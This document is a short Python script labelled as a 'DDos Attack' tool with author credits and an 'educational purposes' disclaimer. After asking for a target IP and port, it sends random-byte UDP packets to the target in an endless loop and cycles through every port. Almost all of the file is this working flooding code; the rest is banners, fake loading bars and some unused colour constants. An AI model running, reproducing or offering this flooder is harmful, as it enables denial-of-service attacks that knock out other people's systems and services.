import sys
import os
import time
import socket
import random
from datetime import datetime

def print_colorful(text, color_code):
    """
    Function to print colorful text using ANSI escape codes.
    """
    print("\033[{}m{}\033[0m".format(color_code, text))

# Color codes for ANSI escape sequences
RED = '31;1m'  # Bold Red
GREEN = '32;1m'  # Bold Green
YELLOW = '33;1m'  # Bold Yellow
BLUE = '34;1m'  # Bold Blue
PURPLE = '35;1m'  # Bold Purple

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet r00tKiMuT")
os.system("figlet DDos Attack")
print()
print("Author       : KiMuT")
print("Twitter/X    : @Adonijah_Kimut")
print("github       : https://github.com/Adonijah01")
print("Disclaimer!!!!! |   THIS TOOL IS JUST FOR EDUCATIONAL PURPOSES.")
print()

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet r00tKiMuT-DDOS")
 

print("[ r00tKiMuT  Starting      ] 0% ")
time.sleep(5)
print("[r00tKiMuT is loading               ] 25%")
time.sleep(5)
print("[r00tKiMuT is loading          ] 50%")
time.sleep(5)

print("[r00tKiMuT is loading     ] 75%")
time.sleep(5)
print("[r00tKiMuT script complete============] 100%")
time.sleep(3)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s through port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1

